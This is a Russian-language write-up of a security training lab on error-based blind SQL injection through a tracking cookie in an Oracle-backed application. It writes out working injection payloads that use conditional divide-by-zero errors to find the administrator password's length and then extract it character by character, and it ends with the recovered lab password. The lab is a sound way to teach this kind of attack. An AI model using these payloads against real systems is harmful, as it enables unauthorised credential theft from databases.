Описание:
Эта лабораторная работа содержит уязвимость слепой SQL-инъекции. Приложение использует tracking-cookie для аналитики и выполняет SQL-запрос, содержащий значение отправленного cookie.
Результаты SQL-запроса не возвращаются, и приложение никак не реагирует по-разному в зависимости от того, возвращает ли запрос какие-либо строки. Если SQL-запрос вызывает ошибку, приложение возвращает пользовательское сообщение об ошибке.
База данных содержит другую таблицу с именем users с колонками username и password.
Чтобы решить лабораторную работу, войдите в систему как пользователь administrator.

При делении на 0 пишется ошибка `Internal Server Error`:
![](../../../z.%20Images/{C591B56D-1292-44E7-9CA9-5E7607A2072C}.png)

`SUBSTRING` приводит к ошибке, значит на сайте возможно Oracle.
![](../../../z.%20Images/{AB70CD3C-1EDF-4841-AFF6-6F39A0AD3D42}.png)

Проверка:
![](../../../z.%20Images/{67ACCAF4-06F7-444B-99E2-F19F56D8BCA0}.png)
Верно, на сайте используется Oracle.

Payload:
`' AND (SELECT CASE WHEN LENGTH(password) = 20 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--`
Пароль админа состоит из 20 символов:
![](../../../z.%20Images/{6AD455E5-CCEF-47AB-A5FF-5904926DCA72}.png)

Payload:
`' AND (SELECT CASE WHEN SUBSTR(password, 1, 1) = 'a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--`
Первый символ пароля:
![](../../../z.%20Images/{A450A8DD-01A1-471C-89C7-D30A0E44C510}.png)

Пароль: `95sle7gg05qn6my62ouh`

Проверка:
![](../../../z.%20Images/{4A36576D-6179-4189-831C-86F5EB1F2D9E}.png)